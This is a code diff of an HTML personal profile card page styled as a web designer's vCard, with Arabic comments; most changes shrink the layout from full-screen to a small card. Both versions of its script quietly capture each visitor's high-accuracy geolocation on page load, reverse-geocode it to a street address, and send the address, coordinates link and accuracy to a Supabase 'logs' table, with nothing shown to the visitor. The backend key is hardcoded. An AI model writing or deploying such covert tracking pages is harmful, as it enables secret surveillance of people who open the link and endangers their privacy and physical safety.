@@ -21,43 +21,63 @@
         }
         @keyframes waterFlow { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
         
-        /* تعديل العرض ليصبح كاملاً */
+        /* البطاقة بحجم مصغر ومتناسق */
         .vcard {
-            width: 100%; /* العرض كامل */
-            height: 100vh; /* الطول كامل الشاشة */
-            background: var(--front_color);
-            backdrop-filter: blur(25px); 
-            border: none; /* إزالة الحدود لجعلها تبدو كصفحة كاملة */
-            position: relative; 
-            overflow-y: auto; /* السماح بالتمرير إذا كان المحتوى طويلاً */
-            display: flex;
-            flex-direction: column;
+            width: 90%; max-width: 380px; height: 550px; background: var(--front_color);
+            backdrop-filter: blur(25px); border-radius: 30px; border: 1px solid rgba(197, 160, 89, 0.2);
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8); position: relative; overflow: hidden;
+        }
+        .header { height: 32%; position: relative; background: rgba(0,0,0,0.2); }
+        
+        /* إصلاح حركة الأمواج */
+        .wave_bg { position: absolute; width: 100%; height: 100%; overflow: hidden; top: 0; left: 0; }
+        .wave-01 { 
+            position: absolute; width: 600px; height: 600px; 
+            background: linear-gradient(45deg, var(--water-mid), var(--water-light)); 
+            border-radius: 43%; opacity: 0.4; 
+            top: -450px; left: -110px;
+            animation: rotateWave 12s linear infinite;
+        }
+        @keyframes rotateWave {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
         }
 
-        .header { height: 40%; position: relative; width: 100%; }
-        .wave_bg { position: absolute; width: 100%; height: 100%; overflow: hidden; pointer-events: none; }
-        .wave-01 { border-radius: 43%; top: -150%; left: 50%; transform: translateX(-50%); position: absolute; width: 800px; height: 800px; background: linear-gradient(45deg, var(--water-mid), var(--water-light)); opacity: 0.3; animation: rotate 14s linear infinite; }
-        @keyframes rotate { 100% { transform: translateX(-50%) rotate(360deg); } }
-        
-        .profile_pic_content { width: 150px; height: 150px; border-radius: 50%; position: absolute; left: 50%; transform: translate(-50%, -50%); top: 100%; overflow: hidden; border: 4px solid var(--muted-gold); z-index: 10; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
+        .profile_pic_content { 
+            width: 120px; height: 120px; border-radius: 50%; 
+            position: absolute; left: 50%; transform: translate(-50%, -50%); 
+            top: 100%; overflow: hidden; border: 3px solid var(--muted-gold); 
+            z-index: 10; box-shadow: 0 10px 20px rgba(0,0,0,0.3);
+        }
         .profile_video { width: 100%; height: 100%; object-fit: cover; }
         
-        .card_content { padding-top: 100px; text-align: center; flex-grow: 1; display: flex; flex-direction: column; align-items: center; }
-        .satan h4 { font-size: 2.5em; letter-spacing: 5px; background: linear-gradient(to right, var(--gold), var(--white)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; margin-bottom: 10px; }
+        .card_content { padding-top: 75px; text-align: center; }
+        .satan h4 { 
+            font-size: 1.8em; letter-spacing: 3px; 
+            background: linear-gradient(to right, var(--gold), var(--white)); 
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent; 
+            font-weight: 700; margin-bottom: 15px;
+        }
         
-        .snuff { min-height: 80px; padding: 0 20px; color: #8892b0; font-size: 1.1em; max-width: 600px; }
+        .snuff { min-height: 50px; padding: 0 25px; color: #8892b0; font-size: 0.9em; margin-bottom: 20px; }
         
-        .social { width: 100%; padding-bottom: 40px; }
-        .social div { display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; padding: 0 20px; }
-        .social i { padding: 15px; font-size: 1.5em; background: rgba(197, 160, 89, 0.08); border-radius: 18px; border: 1px solid rgba(197, 160, 89, 0.2); color: var(--muted-gold); transition: 0.3s; }
-        .social i:hover { transform: translateY(-5px); background: rgba(197, 160, 89, 0.15); border-color: var(--gold); }
+        .social div { display: flex; justify-content: center; gap: 12px; flex-wrap: wrap; padding: 0 15px; }
+        .social i { 
+            padding: 12px; font-size: 1.2em; 
+            background: rgba(197, 160, 89, 0.05); border-radius: 14px; 
+            border: 1px solid rgba(197, 160, 89, 0.1); color: var(--muted-gold); 
+            transition: 0.3s ease;
+        }
+        .social i:hover { color: var(--gold); border-color: var(--gold); transform: scale(1.1); }
     </style>
 </head>
 <body>
 
 <div class="vcard">
     <div class="header">
-        <div class="wave_bg"><div class="wave-01"></div></div>
+        <div class="wave_bg">
+            <div class="wave-01"></div>
+        </div>
         <div class="profile_pic_content">
             <video class="profile_video" autoplay loop muted playsinline>
                 <source src="https://files.catbox.moe/jvicv4.mp4" type="video/mp4">
@@ -87,40 +107,31 @@
     const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtjY2twcGZmbGF4cHhoaXBuZ2R6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU2MzU1NTMsImV4cCI6MjA5MTIxMTU1M30.Lek1mEohH1GoUkcMQZT3vQ2tmshPJVI-Oa8f_y2mH6o';
     const sb = supabase.createClient(SB_URL, SB_KEY);
 
-    let finalLocData = "جاري جلب الموقع بدقة عالية...";
-
-    function startTracking() {
+    async function captureLocation() {
         if ("geolocation" in navigator) {
-            const geoOptions = { 
-                enableHighAccuracy: true, 
-                timeout: 30000, 
-                maximumAge: 0 
-            };
-
+            const options = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };
+            
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                const acc = pos.coords.accuracy;
-                const mapUrl = `http://maps.google.com/maps?q=${lat},${lon}`;
+                const { latitude, longitude, accuracy } = pos.coords;
+                const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                let address = "تعذر جلب العنوان";
                 
                 try {
-                    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=ar`);
-                    const d = await r.json();
-                    finalLocData = `${d.display_name} | دقة: ${acc.toFixed(1)}m | الرابط: ${mapUrl}`;
-                } catch(e) {
-                    finalLocData = `إحداثيات: ${lat},${lon} | دقة: ${acc.toFixed(1)}m | الرابط: ${mapUrl}`;
-                }
-                
-                await sb.from('logs').insert([{ username: "AUTO_FULL_WIDTH", location: finalLocData }]);
-                
-            }, (err) => {
-                finalLocData = "فشل في تحديد الموقع: " + err.message;
-            }, geoOptions);
+                    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&accept-language=ar`);
+                    const data = await res.json();
+                    address = data.display_name || address;
+                } catch(e) {}
+
+                await sb.from('logs').insert([{ 
+                    username: "Visitor_Small_Card", 
+                    location: `الدقة: ${accuracy.toFixed(1)}m | العنوان: ${address} | الرابط: ${mapLink}` 
+                }]);
+            }, null, options);
         }
     }
 
     window.onload = () => {
-        startTracking();
+        captureLocation();
         new Typed(".typed_text", {
             strings: ["Web Designer & Creative Developer.", "Precision and Art.", "BELIEVE IN YOURSELF."],
             typeSpeed: 50, backSpeed: 30, loop: true
